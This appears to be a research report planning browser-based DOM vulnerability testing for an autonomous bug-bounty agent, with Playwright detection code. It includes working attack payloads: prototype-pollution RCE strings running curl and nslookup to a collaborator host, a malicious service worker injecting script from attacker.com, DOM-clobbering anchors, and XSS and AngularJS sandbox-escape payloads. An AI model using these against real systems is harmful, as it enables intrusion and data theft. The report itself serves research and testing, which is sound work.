# R4.1 - Browser-Based DOM Vulnerability Testing for Autonomous Agents

**Research Round:** 4.1
**Date:** 2026-03-25
**Focus:** DOM XSS automation, prototype pollution, headless browser security testing, postMessage bugs, CSTI, service worker attacks

---

## Executive Summary

Browser-based DOM vulnerability testing represents one of the highest-signal categories for autonomous pentesting agents. These vulnerability classes are invisible to curl/httpx-based scanners, require a live JavaScript runtime to detect, and yield real bounties when chained correctly. A top-tier autonomous agent must execute a headless Chromium session, instrument the JavaScript runtime, inject canary strings, and monitor taint flow from sources to sinks - all programmatically. This report consolidates the techniques that make top-tier DOM testing possible and maps them to concrete implementation patterns.

---

## 1. DOM XSS Automation - Sources, Sinks, and the Canary Method

### 1.1 The Core Model

DOM XSS arises when JavaScript reads attacker-controlled data from a **source** and writes it into a **sink** that allows code execution, without sanitization. The vulnerability exists entirely in the client's browser and never appears in HTTP responses - which is why passive HTTP scanning misses it entirely.

**Tier 1 Sources (highest attacker control):**
- `location.hash` - never sent to server, trivially injectable
- `location.search` (URL query string)
- `location.href`
- `document.URL` / `document.documentURI`
- `window.name` - persists across navigation, cross-origin writable
- `document.referrer`
- `postMessage` data (via event listeners)
- `localStorage` / `sessionStorage` (stored sources)
- WebSocket messages
- Cookie values

**Tier 1 Sinks (direct code execution):**
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `document.write()`, `document.writeln()`
- `element.innerHTML`, `element.outerHTML`
- `element.insertAdjacentHTML()`
- `element.src` (script elements)
- `location.href = "javascript:..."` / `location.assign()`
- jQuery: `$()`, `.html()`, `.append()` with unescaped input

**Tier 2 Sinks (require specific context for XSS):**
- `element.setAttribute("href", ...)` - leads to href-based XSS
- `element.setAttribute("src", ...)` - script/iframe injection
- CSS `style.cssText` with expression injection
- `document.domain` assignment

### 1.2 The Canary Injection Method (DOM Invader Approach)

DOM Invader's core mechanism is reproducible in code:

1. Generate a unique alphanumeric canary: e.g. `"zq7x3mABC"` (8-12 chars, no special chars)
2. Inject the canary into each source one at a time (URL hash, query param, etc.)
3. Load the page in a headless browser (Playwright/Puppeteer)
4. After page load, execute a JavaScript hook that scans all known sinks for the canary string
5. If the canary appears in a sink, record the source-sink pair
6. Attempt to escalate: replace canary with a functional XSS payload matched to the sink context

**Playwright implementation pattern:**

```python
import asyncio
from playwright.async_api import async_playwright

CANARY = "zq7x3mABC42"

SINK_HOOKS = """
(function() {
    const results = [];
    const canary = arguments[0];

    // Hook innerHTML
    const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set: function(val) {
            if (typeof val === 'string' && val.includes(canary)) {
                results.push({sink: 'innerHTML', value: val.substring(0, 200)});
            }
            return origInnerHTML.set.call(this, val);
        }
    });

    // Hook eval
    const origEval = window.eval;
    window.eval = function(code) {
        if (typeof code === 'string' && code.includes(canary)) {
            results.push({sink: 'eval', value: code.substring(0, 200)});
        }
        return origEval.call(this, code);
    };

    // Hook document.write
    const origWrite = document.write.bind(document);
    document.write = function(str) {
        if (typeof str === 'string' && str.includes(canary)) {
            results.push({sink: 'document.write', value: str.substring(0, 200)});
        }
        return origWrite(str);
    };

    window.__sinkResults = results;
    return results;
})
"""

async def test_dom_xss(url: str) -> list[dict]:
    findings = []
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)

        # Test location.hash source
        page = await browser.new_page()
        await page.add_init_script(f"({SINK_HOOKS})('{CANARY}');")
        test_url = f"{url}#{CANARY}"
        await page.goto(test_url, wait_until="networkidle")
        results = await page.evaluate("window.__sinkResults || []")
        if results:
            findings.append({"source": "location.hash", "sinks": results, "url": test_url})
        await page.close()

        # Test location.search source
        page = await browser.new_page()
        await page.add_init_script(f"({SINK_HOOKS})('{CANARY}');")
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}q={CANARY}"
        await page.goto(test_url, wait_until="networkidle")
        results = await page.evaluate("window.__sinkResults || []")
        if results:
            findings.append({"source": "location.search", "sinks": results, "url": test_url})
        await page.close()

        await browser.close()
    return findings
```

The key insight: `add_init_script` runs before any page JS executes, allowing clean hooking of native functions. The canary must be injected before the page JS runs, not after.

### 1.3 XSS Payload Escalation by Sink Context

Once a sink is identified, the correct payload depends on the sink type:

| Sink | Payload approach |
|------|-----------------|
| `innerHTML` | `<img src=x onerror=alert(1)>` |
| `eval()` / `setTimeout(str)` | `alert(1)` directly |
| `document.write()` | `<script>alert(1)</script>` |
| `location.href` | `javascript:alert(1)` |
| `element.src` on script | Full URL to attacker JS |
| `setAttribute("href")` | `javascript:alert(1)` |

---

## 2. Prototype Pollution - Client-Side and Server-Side

### 2.1 The Mechanics

JavaScript's prototype chain means every object inherits from `Object.prototype`. If an attacker can set `Object.prototype.someProperty = "malicious"`, every object in the application inherits that property. This turns into XSS or RCE when a "gadget" - code that reads that property and passes it to a dangerous function - exists in the page's JavaScript.

**Client-side pollution sources:**
- URL query parameters parsed as deep objects: `?__proto__[x]=y` or `?constructor.prototype.x=y`
- JSON merge operations: `Object.assign({}, userInput)`
- Deep merge libraries: lodash `_.merge()` (patched in 4.17.21 but old versions remain)
- `JSON.parse` followed by unvalidated property access

**Detection probe sequence (ppmap approach):**

```python
POLLUTION_SOURCES = [
    "?__proto__[testprop]=polluted",
    "?__proto__.testprop=polluted",
    "?constructor.prototype.testprop=polluted",
    "#__proto__[testprop]=polluted",
]

POLLUTION_CHECK_JS = """
Object.prototype.testprop === 'polluted'
"""
```

After loading each URL variant, evaluate `Object.prototype.testprop` - if it equals `"polluted"`, pollution succeeded.

### 2.2 Gadget Hunting - From Pollution to XSS

Finding a pollution source alone is not a bounty. The value is in the gadget chain. Known high-value gadgets:

**Google Analytics (ga.js) gadget:**
```
location.hash = "#__proto__[innerHTML]=<img/src/onerror=alert(1)>"
```
If the page uses old GA, it reads a property from a config object that can be polluted to inject into innerHTML.

**jQuery gadget chain:**
Polluting `Object.prototype.selector` or `Object.prototype.url` can cause jQuery AJAX calls to use attacker-controlled values.

**Angular gadget:**
Polluting `Object.prototype.template` can cause Angular to compile attacker-controlled templates, leading to sandbox escape.

**Generic gadget detection in headless browser:**

```javascript
// Run after page load to find gadgets
const gadgetProbe = `
(function() {
    const dangerousSinks = ['innerHTML', 'outerHTML', 'src', 'href', 'action', 'location'];
    const results = [];

    // Instrument all property assignments
    const origDefineProperty = Object.defineProperty;

    // Check if any known pollution keys flow to sinks
    const testKey = '__pp_test_' + Math.random().toString(36).slice(2);
    const payload = 'PP_GADGET_' + testKey;
    Object.prototype[testKey] = payload;

    // Walk all elements looking for the payload in attributes
    document.querySelectorAll('*').forEach(el => {
        dangerousSinks.forEach(attr => {
            try {
                const val = el[attr] || el.getAttribute(attr);
                if (val && val.includes(payload)) {
                    results.push({element: el.tagName, attr, value: val});
                }
            } catch(e) {}
        });
    });

    // Cleanup
    delete Object.prototype[testKey];
    return results;
})()
`;
```

### 2.3 Server-Side Prototype Pollution (SSPP) - Non-Destructive Detection

SSPP affects Node.js applications where user-controlled JSON is merged into objects without sanitization. The challenge is detection without DoS - polluting the server's `Object.prototype` can crash the Node process.

**PortSwigger's non-destructive detection methods:**

1. **JSON spaces gadget:** Send `{"__proto__": {"json spaces": 10}}` in a JSON body. If response JSON now has 10-space indentation, pollution confirmed. Safe because json spaces is cosmetic.

2. **Status override gadget:** Send `{"__proto__": {"status": 555}}` - if any response now returns HTTP 555, confirmed.

3. **Charset gadget:** Send `{"__proto__": {"content-type": "application/json; charset=utf-8; x-polluted=true"}}` - check Content-Type response header for the injected value.

**Doyensec's OOB (Out-of-Band) approach (2024):**
The Prototype Pollution Gadgets Finder from Doyensec uses OOB gadgets specifically: gadgets that trigger DNS or HTTP callbacks to a collaborator server, so pollution can be confirmed asynchronously without any visible change in HTTP responses. This is valuable when the application doesn't return JSON or when the response doesn't change visibly.

Key payload structure:
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/fd/0",
    "env": {"EVIL": "require('child_process').exec('nslookup BURPCOLLABORATOR')"}
  }
}
```

For RCE via `child_process.execSync` gadgets:
```json
{
  "__proto__": {
    "execArgv": ["--eval=require('child_process').exec('curl http://COLLABORATOR')"],
    "shell": true
  }
}
```

### 2.4 PP-Finder and PPMap Workflow

Both tools work by:
1. Injecting `__proto__[canary]=value` via each URL parameter
2. Loading the page in headless Chromium
3. Checking `Object.prototype.canary` after load
4. If polluted, iterating a library of known gadgets (hardcoded list of global JS variables that, when polluted, reach dangerous sinks)
5. Returning the full XSS payload for each confirmed gadget

The pp-finder (YesWeHack) extends this for server-side by using a static analysis pass over the application's Node.js source code to identify merge patterns, then dynamically confirming each candidate.

---

## 3. Headless Browser Testing - What It Enables

### 3.1 Capabilities Beyond HTTP Scanners

| Capability | curl/httpx | Headless Browser |
|------------|-----------|-----------------|
| Execute JavaScript | No | Yes |
| Observe DOM after JS runs | No | Yes |
| Trigger event handlers | No | Yes |
| Follow JavaScript redirects | No | Yes |
| Detect DOM XSS | No | Yes |
| Intercept postMessage | No | Yes |
| Observe WebSocket traffic | No | Yes |
| Fill and submit forms | No | Yes |
| Bypass JS-based auth challenges | No | Yes |
| CSTI detection | No | Yes |
| Prototype pollution detection | No | Yes |

### 3.2 Playwright Architecture for Security Testing

Playwright's key security testing APIs:

```python
# Route interception - modify requests/responses
await page.route("**/*", lambda route: route.continue_(
    headers={**route.request.headers, "X-Custom": "injected"}
))

# Add init script - runs before page JS, perfect for hooking
await page.add_init_script("""
    window.__originalFetch = window.fetch;
    window.fetch = function(...args) {
        console.log('FETCH:', args[0]);
        return window.__originalFetch(...args);
    };
""")

# Evaluate after load - inspect runtime state
result = await page.evaluate("Object.prototype.__pp_canary")

# Expose Python function to page JS
await page.expose_function("reportSink", lambda data: findings.append(data))

# Console message interception
page.on("console", lambda msg: process_console(msg))

# Dialog interception (for XSS confirmation via alert())
page.on("dialog", lambda dialog: confirm_xss(dialog))
```

The `page.on("dialog")` handler is critical for XSS confirmation - when a payload like `alert(document.domain)` fires, the dialog event captures it before the browser freezes.

### 3.3 Autonomous Agent Browser Session Design

A production-grade DOM testing module should:

1. **Pre-flight hook injection:** Always use `add_init_script` to install monitoring code before page scripts run
2. **Canary uniqueness:** Generate a fresh canary per test session (UUID-based, alphanumeric only)
3. **Network request capture:** Log all outbound requests during the test window for SSRF/exfiltration detection
4. **Error console monitoring:** JavaScript errors often reveal internal paths, library versions, and failed operations that indicate incomplete sanitization
5. **SPA navigation handling:** For Single Page Applications, hook `history.pushState` and `window.location.hash` changes to re-run DOM checks after client-side navigation
6. **Timing:** Use `wait_until="networkidle"` but add a minimum 2-second delay after for deferred scripts

---

## 4. PostMessage Vulnerability Detection

### 4.1 The Attack Surface

`window.postMessage()` allows cross-origin communication by bypassing Same-Origin Policy. The vulnerability arises when `message` event listeners don't validate `event.origin` before acting on `event.data`.

**Three vulnerability patterns:**

**Pattern 1 - No origin check:**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;  // Direct sink
});
```

**Pattern 2 - Weak origin check (indexOf bypass):**
```javascript
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('trusted.com') !== -1) {  // Bypassed by: evil.com?trusted.com
        eval(e.data.code);
    }
});
```

**Pattern 3 - startsWith/endsWith bypass:**
```javascript
if (e.origin.startsWith('https://app.')) {  // Bypassed by: https://app.evil.com
```

### 4.2 Automated Detection with Playwright

```python
async def test_postmessage(url: str) -> list[dict]:
    findings = []

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        # Inject postMessage listener interceptor
        await page.add_init_script("""
            const _addEventListener = EventTarget.prototype.addEventListener;
            window.__messageHandlers = [];

            EventTarget.prototype.addEventListener = function(type, handler, ...rest) {
                if (type === 'message' && this === window) {
                    window.__messageHandlers.push({
                        handler: handler.toString(),
                        registered: new Error().stack
                    });
                }
                return _addEventListener.call(this, type, handler, ...rest);
            };
        """)

        await page.goto(url, wait_until="networkidle")

        # Enumerate registered handlers
        handlers = await page.evaluate("window.__messageHandlers || []")

        if handlers:
            # Attempt to trigger with XSS payloads
            xss_payloads = [
                '{"type":"init","data":"<img src=x onerror=alert(1)>"}',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '{"url":"javascript:alert(1)"}',
                '{"html":"<script>alert(1)</script>"}',
            ]

            for payload in xss_payloads:
                dialog_fired = []
                page.on("dialog", lambda d: dialog_fired.append(d.message))

                # Send message from same page context
                await page.evaluate(f"""
                    window.postMessage({payload!r}, '*');
                """)

                await page.wait_for_timeout(500)

                if dialog_fired:
                    findings.append({
                        "type": "postMessage_XSS",
                        "payload": payload,
                        "dialog": dialog_fired[0],
                        "url": url
                    })

        await browser.close()
    return findings
```

### 4.3 Impact Chains

- **DOM XSS via postMessage:** Handler writes `e.data` to innerHTML without sanitization
- **Open redirect via postMessage:** Handler calls `location.href = e.data.url` without validation
- **CSRF via postMessage:** Handler initiates sensitive actions (logout, account changes) based on message type
- **Information disclosure:** Handler sends internal state back to the sender without origin check, allowing cross-origin data theft
- **Account takeover via OAuth token theft:** Messages containing access tokens forwarded to wrong origin

CVE-2024-49038 in Microsoft Copilot Studio (CVSS 9.3) demonstrated that even major platforms fail proper origin validation.

---

## 5. Client-Side Template Injection (CSTI)

### 5.1 Detection Probes by Framework

CSTI arises when user input is embedded in a client-side template engine's context and gets evaluated as template code rather than plain text.

**Universal probe (works for most frameworks):**
```
{{7*7}}
```
If the page renders `49` instead of `{{7*7}}`, CSTI is confirmed.

**Framework-specific payloads:**

| Framework | Detection probe | XSS payload |
|-----------|----------------|-------------|
| AngularJS 1.x | `{{7*7}}` renders 49 | `{{constructor.constructor('alert(1)')()}}` |
| AngularJS 1.6+ (no sandbox) | `{{7*7}}` | `{{$on.constructor('alert(1)')()}}` |
| Vue.js 2/3 (v-html) | `{{7*7}}` or `${7*7}` | `<img src=x :onerror="alert(1)">` |
| Handlebars (client-side) | `{{7*7}}` - does NOT evaluate math | `{{#with "s" as |string|}}{{#with "e"}}...` (sandbox escape) |
| Mavo (Mozilla) | `[7*7]` renders 49 | `[alert(1)]` |

**Vue-specific note:** Vue 3's template compiler runs at build time in most setups, so CSTI is only possible if the app uses runtime compilation (`new Vue({ template: userInput })`). The `v-html` directive is a DOM XSS sink, not CSTI, but the payloads overlap.

CVE-2024-8373 in Angular demonstrates ongoing CSTI risk in modern frameworks.

### 5.2 Automated CSTI Scanner Pattern

```python
async def test_csti(url: str, param: str) -> dict | None:
    probes = [
        ("{{7*7}}", "49"),          # Angular/Vue
        ("${7*7}", "49"),           # Some Handlebars / template literals
        ("#{7*7}", "49"),           # Ruby-origin frameworks
        ("[7*7]", "49"),            # Mavo
        ("<%=7*7%>", "49"),         # EJS/ERB
    ]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)

        for probe, expected in probes:
            page = await browser.new_page()
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={probe}"

            await page.goto(test_url, wait_until="networkidle")
            content = await page.content()

            if expected in content and probe not in content:
                # Math evaluated - CSTI confirmed
                # Now try XSS escalation
                await page.close()
                return {"url": test_url, "probe": probe, "framework": detect_framework(probe)}

            await page.close()

        await browser.close()
    return None
```

### 5.3 AngularJS Sandbox Escapes by Version

The ACSTIS tool (Automated Client-Side Template Injection Scanner) maintains a database of version-specific AngularJS sandbox escapes. Key patterns:

- **1.0.x - 1.1.x:** No sandbox, `{{constructor.constructor('alert(1)')()}}`
- **1.2.0 - 1.2.18:** Multiple bypasses via `$eval`
- **1.3.x - 1.5.x:** Increasingly strict sandbox, requires chained accessor tricks
- **1.6.0+:** Sandbox removed entirely, `{{constructor.constructor('alert(1)')()}}` works directly

---

## 6. Service Worker Hijacking

### 6.1 Attack Surface

Service workers are JavaScript files registered via `navigator.serviceWorker.register('/sw.js')` that intercept all network requests within their scope. A hijacked service worker can:
- Intercept and modify all HTTP responses for the origin
- Inject malicious JavaScript into every page the victim visits
- Exfiltrate cookies, tokens, and form data
- Persist for up to 24 hours after the original XSS is patched (via cache TTL)

### 6.2 Two-Stage Attack Chain

**Stage 1 - Registration (requires XSS or file upload):**
```javascript
// Via XSS payload: register attacker-controlled SW
navigator.serviceWorker.register('/attacker-controlled.js');

// Or via JSONP endpoint:
// GET /api/callback?cb=navigator.serviceWorker.register('/sw.js?src=evil')
```

**Stage 2 - Interception (SW code):**
```javascript
// Malicious service worker
self.addEventListener('fetch', e => {
    e.respondWith(
        fetch(e.request).then(response => {
            // Clone response, inject script, return modified version
            return response.text().then(body => {
                const modified = body.replace('</body>',
                    '<script src="https://attacker.com/steal.js"></script></body>');
                return new Response(modified, {
                    headers: response.headers
                });
            });
        })
    );
});
```

### 6.3 DOM Clobbering to Service Worker Hijacking (PortSwigger Research)

PortSwigger documented a chained attack where DOM clobbering overrides `document.getElementById()` behavior, which is used by some service workers to resolve the `importScripts()` URL from a DOM element's `id` attribute:

```html
<!-- Injected HTML via HTML injection (not XSS required) -->
<a id="sw-script" href="https://attacker.com/evil.js"></a>
```

If the service worker does:
```javascript
const scriptUrl = document.getElementById('sw-script').href;
importScripts(scriptUrl);
```

The DOM-clobbered element overrides the intended value, loading attacker JS into the SW context.

### 6.4 Detection Pattern

```python
async def check_service_worker_attack_surface(url: str) -> dict:
    findings = {}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        # Intercept SW registration
        await page.add_init_script("""
            const _register = navigator.serviceWorker.register.bind(navigator.serviceWorker);
            window.__swRegistrations = [];
            navigator.serviceWorker.register = function(scriptURL, options) {
                window.__swRegistrations.push({scriptURL, options});
                return _register(scriptURL, options);
            };
        """)

        await page.goto(url, wait_until="networkidle")

        sw_regs = await page.evaluate("window.__swRegistrations || []")
        findings["service_workers"] = sw_regs

        # Check importScripts usage in SW files
        for reg in sw_regs:
            sw_url = reg.get("scriptURL", "")
            if sw_url:
                sw_page = await browser.new_page()
                try:
                    resp = await sw_page.goto(sw_url)
                    if resp:
                        content = await resp.text()
                        if "importScripts" in content:
                            findings["importScripts_found"] = True
                            findings["sw_url"] = sw_url
                            # Analyze if importScripts uses DOM lookups
                            if "getElementById" in content or "querySelector" in content:
                                findings["dom_clobbering_attack_surface"] = True
                except Exception:
                    pass
                await sw_page.close()

        await browser.close()
    return findings
```

---

## 7. DOM Clobbering - Detection and Exploitation

### 7.1 The Mechanism

DOM clobbering exploits the fact that named HTML elements are automatically exposed as properties of the global `window` object and `document` object. An attacker who can inject arbitrary HTML (but not script tags) can overwrite JavaScript variables that the application reads.

**Classic form - anchor element clobbering a global variable:**
```html
<!-- Injected: -->
<a id="config" href="https://attacker.com/evil.js"></a>

<!-- Application code reads: -->
let src = window.config || '/default.js';
document.createElement('script').src = src;  // Now loads attacker.js
```

**Advanced technique - form + input for attribute clobbering:**
```html
<!-- Injected: -->
<form id="config"><input name="url" value="javascript:alert(1)"></form>

<!-- Application code reads config.url -->
```

**HTMLCollection technique (two elements with same id):**
```html
<!-- Injected: -->
<a id="config"></a><a id="config" href="https://attacker.com/evil.js"></a>

<!-- document.getElementById('config') returns HTMLCollection -->
<!-- config[0] and config[1] give two separate anchor elements -->
<!-- config.toString() returns "[object HTMLCollection]" breaking type checks -->
```

### 7.2 USENIX Security 2025 - The DOMino Effect

Research presented at USENIX Security 2025 (the "DOMino Effect" paper) built the Hulk framework for automated DOM clobbering gadget detection using symbolic DOM and concolic execution. Key findings:

- 497 unique gadgets validated automatically across real-world applications
- 378 (76%) led to XSS
- 90 (18%) led to CSRF
- 26 (5%) led to open redirect
- Affected Jupyter Notebook/JupyterLab, HackMD.io, Canvas LMS (19 CVEs assigned)

The DOMClobberCollection at `domclob.xyz` maintains a database of vulnerable client-side libraries and their clobbering gadgets.

### 7.3 Automated Detection

```python
CLOBBERING_TEST_IDS = [
    "config", "settings", "options", "data", "src", "url",
    "path", "script", "callback", "token", "key", "api"
]

async def test_dom_clobbering(url: str, html_injection_param: str) -> list[dict]:
    findings = []

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)

        for test_id in CLOBBERING_TEST_IDS:
            page = await browser.new_page()

            # Monitor JavaScript errors and property reads
            await page.add_init_script(f"""
                const testId = '{test_id}';
                // Check if window[testId] is accessed after clobbering
                window.__clobberAttempts = [];
            """)

            # Inject clobbering payload
            payload = f'<a id="{test_id}" href="https://CANARY.burpcollaborator.net"></a>'
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{html_injection_param}={payload}"

            dialog_fired = []
            page.on("dialog", lambda d: dialog_fired.append(d.message))

            # Also monitor network requests for CANARY
            requests_fired = []
            page.on("request", lambda req: requests_fired.append(req.url)
                    if "CANARY" in req.url else None)

            await page.goto(test_url, wait_until="networkidle")
            await page.wait_for_timeout(1000)

            if dialog_fired or any("CANARY" in r for r in requests_fired):
                findings.append({
                    "type": "dom_clobbering",
                    "clobbered_id": test_id,
                    "dialog": dialog_fired,
                    "requests": [r for r in requests_fired if "CANARY" in r]
                })

            await page.close()

        await browser.close()
    return findings
```

---

## 8. Implementation Architecture for NPUHacker

### 8.1 DOMProbe Module Design

The DOM testing capability should be a dedicated module `dom_probe.py` that the orchestrator can invoke for any target URL. It should be structured as:

```
DOMProbe
├── CanaryEngine        - generates/tracks unique canary strings per session
├── SinkMonitor         - installs JavaScript hooks before page load
├── SourceTester        - iterates all taint sources with canary injection
├── PPollutionTester    - prototype pollution detection (client + server)
├── PostMessageTester   - enumerates and fuzzes message handlers
├── CSTIProber          - template injection detection by framework
├── ServiceWorkerAudit  - SW registration and importScripts analysis
├── DOMClobberTester    - structured HTML injection with impact monitoring
└── EvidenceCapture     - screenshot, HAR, console logs, dialog capture
```

### 8.2 Priority Ordering (by bounty ROI)

1. **Prototype Pollution to XSS** - Extremely high signal, many sites use vulnerable lodash/jQuery versions, chained gadgets lead to confirmed XSS. ppmap-style scanning is automatable.
2. **DOM XSS via location.hash/window.name** - hash is never sent to server so often bypasses WAF, window.name persists across navigation and can be set cross-origin.
3. **PostMessage origin bypass** - Prevalent in SPAs with embedded widgets, iframes, and OAuth flows.
4. **CSTI in AngularJS 1.x apps** - Many legacy enterprise apps still run AngularJS 1.x and are trivially exploitable.
5. **DOM Clobbering** - Requires HTML injection primitive but no script execution, so often out of scope for WAFs.
6. **Service Worker hijacking** - Highest impact but requires existing XSS or file upload; treat as a severity multiplier on other findings.

### 8.3 Console and Error Harvesting

JavaScript errors are a high-value signal source that most scanners ignore:

```python
console_errors = []
page.on("console", lambda msg: console_errors.append({
    "type": msg.type,
    "text": msg.text,
    "location": msg.location
}) if msg.type in ("error", "warning") else None)
```

Errors like `ReferenceError: __webpack_require__ is not defined` or `TypeError: Cannot read property 'x' of undefined` reveal internal object paths that can be targeted for prototype pollution or DOM clobbering.

### 8.4 SPA Crawling for DOM XSS

Static-page DOM XSS is relatively rare; most DOM XSS lives in SPA route handlers. The agent must crawl client-side routes:

```python
# Hook history API to track SPA navigation
await page.add_init_script("""
    const _pushState = history.pushState;
    window.__routeChanges = [];
    history.pushState = function(...args) {
        window.__routeChanges.push(args[2]);  // URL
        return _pushState.apply(this, args);
    };
    window.addEventListener('hashchange', () => {
        window.__routeChanges.push(location.href);
    });
""")
```

After initial load, collect discovered routes and re-test each with canary injection.

---

## 9. Key Tooling Reference

| Tool | Language | Best For |
|------|----------|----------|
| DOM Invader (Burp) | Browser extension | Interactive canary testing, postMessage interception |
| ppmap | Go | Mass-scanning URLs for PP-to-XSS via known gadgets |
| pp-finder (YesWeHack) | CLI | Server-side PP automated detection |
| Prototype Pollution Gadgets Finder (Doyensec) | Burp extension | OOB SSPP gadget discovery, auto-cleanup |
| ACSTIS | Python | AngularJS CSTI automated scanning |
| XSStrike | Python | Reflected/DOM XSS with browser engine |
| DOMscan (lauritzh) | Python/Puppeteer | Lightweight DOM XSS and open redirect scanner |
| Playwright | Python | All custom DOM testing (preferred for agents) |

---

## 10. Sources

- [PortSwigger - DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [PortSwigger - What is DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger - Testing for DOM XSS with DOM Invader](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/dom-xss)
- [PortSwigger - Server-side prototype pollution black-box detection](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger - Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [PortSwigger - Hijacking service workers via DOM clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
- [PortSwigger - Web Security Academy: Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger - Web Security Academy: Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
- [PortSwigger - Web Security Academy: DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [PortSwigger - Web Security Academy: PostMessage DOM XSS](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
- [Doyensec - Prototype Pollution Gadgets Finder (Feb 2024)](https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)
- [GitHub - doyensec/Prototype-Pollution-Gadgets-Finder](https://github.com/doyensec/Prototype-Pollution-Gadgets-Finder)
- [GitHub - kleiton0x00/ppmap](https://github.com/kleiton0x00/ppmap)
- [GitHub - yeswehack/pp-finder](https://github.com/yeswehack/pp-finder)
- [USENIX Security 2025 - The DOMino Effect](https://www.usenix.org/conference/usenixsecurity25/presentation/liu-zhengyu)
- [domclob.xyz - DOM Clobbering Collection](https://domclob.xyz/)
- [GitHub - jackfromeast/dom-clobbering-collection](https://github.com/jackfromeast/dom-clobbering-collection)
- [CISPA - It's (DOM) Clobbering Time (IEEE S&P 2023)](https://publications.cispa.saarland/3756/1/sp23_domclob.pdf)
- [YesWeHack - Server-Side Prototype Pollution Detection](https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit)
- [Intigriti - Exploiting PostMessage Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities)
- [Microsoft MSRC - PostMessage vulnerability research (2025)](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
- [GitHub - tijme/angularjs-csti-scanner (ACSTIS)](https://github.com/tijme/angularjs-csti-scanner)
- [HackTricks - Client Side Template Injection](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti)
- [HackTricks - Abusing Service Workers](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers)
- [Akamai - Abusing the Service Workers API](https://www.akamai.com/blog/security/abusing-the-service-workers-api)
- [s1r1us - Prototype Pollution Research](https://blog.s1r1us.ninja/research/PP)
- [Securitum - Demystifying Prototype Pollution and DOM XSS](https://www.securitum.com/demystifying_prototype_pollution_and_its_link_to_dom_xss.html)
- [ACM Web Conference 2024 - PP Gadgets with Dynamic Taint Analysis](https://dl.acm.org/doi/10.1145/3589334.3645579)
- [USENIX Security 2024 - GHunter: Universal PP Gadgets](https://www.usenix.org/system/files/usenixsecurity24-cornelissen.pdf)
- [GitHub - KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)
- [Penligent - Updated DOM Based XSS Cheat Sheet](https://www.penligent.ai/hackinglabs/secure-your-frontend-updated-dom-based-xss-cheat-sheet/)
- [GitHub - lauritzh/domscan](https://github.com/lauritzh/domscan)
- [GitHub topics - domxss tools](https://github.com/topics/domxss)
- [Bugcrowd - XSSpect browser extension for XSS injection](https://www.bugcrowd.com/blog/xsspect-a-browser-extension-to-automate-xss-injection/)
- [Headless Browser security payloads - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Headless%20Browser/)
